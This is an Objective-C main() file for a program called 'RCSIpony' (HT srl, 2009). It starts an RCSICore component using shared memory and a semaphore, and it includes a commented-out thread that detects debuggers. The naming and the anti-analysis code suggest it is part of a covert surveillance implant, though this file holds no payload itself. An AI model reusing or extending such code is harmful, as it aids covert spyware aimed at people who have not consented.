/*
 * RCSIpony
 *  pon pon
 *
 * Created by Alfredo 'revenge' Pesoli on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#import "RCSICore.h"
#import "RCSIConfManager.h"
#import "RCSICommon.h"
#import "RCSITaskManager.h"

#import "RCSILogger.h"
#import "RCSIDebug.h"


int main (int argc, const char * argv[])
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  int shMemKey  = 31337;
  int shMemSize = SHMEM_COMMAND_MAX_SIZE;
  NSString *semaphoreName = @"SUX";
  
#ifdef ENABLE_LOGGING
  [RCSILogger setComponent: @"core"];
  infoLog(@"STARTING");
#endif

  //CFShow (CFRunLoopGetCurrent ());
  RCSICore *core = [[RCSICore alloc] initWithKey: shMemKey
                                sharedMemorySize: shMemSize
                                   semaphoreName: semaphoreName];
  
  //
  // Spawn a thread which checks whenever a debugger is attaching our app
  //
  /*
  [NSThread detachNewThreadSelector: @selector(amIBeingDebugged)
                           toTarget: core
                         withObject: nil];
  */
  [core runMeh];
  
  [pool release];
  [core release];
  
  return 0;
}
